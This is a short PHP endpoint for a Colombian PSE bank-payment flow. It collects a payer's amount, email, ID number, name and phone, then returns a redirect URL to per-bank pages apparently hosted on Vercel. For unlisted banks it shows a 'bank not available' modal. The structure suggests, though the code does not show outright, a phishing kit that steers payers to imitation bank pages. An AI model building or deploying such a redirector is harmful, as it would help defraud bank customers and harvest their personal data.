<?php
header('Content-Type: application/json');
require_once __DIR__ . '/config.php';

$banco     = $_GET['banco']     ?? '';
$monto     = intval($_GET['monto']     ?? 0);
$email     = trim($_GET['email']     ?? '');
$cedula    = trim($_GET['cedula']    ?? '');
$nombre    = trim($_GET['nombre']    ?? '');
$telefono  = trim($_GET['telefono']  ?? '');

// Bancos con vercel
if (isset($PSE_BANKS[$banco])) {
    $b = $PSE_BANKS[$banco];
    echo json_encode(['url' => PSE_BASE . '/sites/' . $b['slug'] . '/manager/' . $b['id'], 'delay' => 2000]);
    exit;
}

// Todos los demás → modal de banco no disponible
echo json_encode(['url' => null, 'delay' => 2000]);
